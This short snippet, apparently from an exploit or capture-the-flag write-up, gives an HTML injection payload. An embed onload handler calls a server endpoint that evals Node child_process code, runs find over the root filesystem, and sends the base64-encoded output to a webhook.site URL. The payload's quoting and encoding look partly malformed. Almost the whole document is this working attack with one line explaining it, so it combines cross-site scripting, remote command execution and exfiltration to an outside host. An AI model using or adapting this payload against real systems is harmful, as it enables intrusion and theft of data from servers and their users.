1. With **webhook**
```html
<embed src=1 onload="fetch(./?eval=require( 'child_process' ).spawnSync( 'find', ['/']).stdout.toString()).then(a=>a.text()).then(a=>fetch('https://webhook.site/ae0bd822-b34b-4e87-aa65-3c22bc4c9999?c=%27+btoa(a)))%22%3E
```
*Command will exec a find command in location `/` after that send all that to plain text to webhook in URL `https://webhook.site/...`*

